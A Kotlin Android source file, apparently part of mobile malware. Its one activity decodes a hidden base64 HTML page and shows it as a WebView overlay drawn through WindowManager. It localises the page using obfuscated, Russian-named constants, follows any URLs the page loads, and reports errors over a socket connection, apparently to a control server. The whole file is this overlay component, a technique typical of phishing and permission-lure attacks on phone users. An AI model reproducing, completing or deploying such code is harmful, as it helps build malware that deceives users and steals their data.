package com.xxx.zzz.notifp

import android.graphics.PixelFormat
import android.os.Bundle
import android.util.Base64
import android.view.Gravity
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import com.xxx.zzz.PermissionsActivity
import com.xxx.zzz.globp.constNm
import com.xxx.zzz.socketsp.IOSocketyt
import java.util.*


class DialogActivityasd : AppCompatActivity() {

    var webView: WebView? = null
    val wm by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }

    override fun onCreate(savedInstanceState: Bundle?) {
        runCatching {
            window.setFlags(
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
            )
            window.setFlags(
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
            )

            super.onCreate(savedInstanceState)

            var base64 = PermissionsActivity.s228
            val data = Base64.decode(base64, Base64.DEFAULT)
            base64 = String(data, constNm.utf)

            val lang = Locale.getDefault().language
            val lan = "en"
            base64 = base64.replace("<html lang=\"$lan\">", "<html lang=\"$lang\">")
            base64 = base64.replace(
                constNm.ключ_от_всего,
                constNm.шифрование + lang + constNm.ss5
            )

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                2,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or
//                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
//                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, //or
//                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT
            )
            params.gravity = Gravity.BOTTOM

            webView = WebView(this@DialogActivityasd)
            webView?.setOnClickListener {
                runCatching { finish() }
            }
            webView?.setOnTouchListener { v, vv ->
                runCatching { finish() }
                true
            }
            webView?.loadDataWithBaseURL(null, base64, "text/html", "UTF-8", null)
            webView?.webViewClient = object : WebViewClient() {
                @Deprecated("Deprecated in Java")
                override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                    view.loadUrl(url)
                    return true
                }
            }

            wm.addView(webView, params)
        }.onFailure {
            IOSocketyt.sendLogs("", "DialogActivityasd onCreate ${it.localizedMessage}", "error")
            finish()
        }
    }

    override fun onBackPressed() {
        if (webView?.canGoBack() == true) {
            webView?.goBack()
        } else {
            super.onBackPressed() // maybe you can even change this as needed
        }
    }

    public override fun onDestroy() {
        runCatching {
            if (webView != null) {
                wm.removeView(webView)
                webView?.removeAllViews()
                webView?.destroy()
                webView = null
            }
        }.onFailure {
            finish()
        }
        super.onDestroy()
    }
}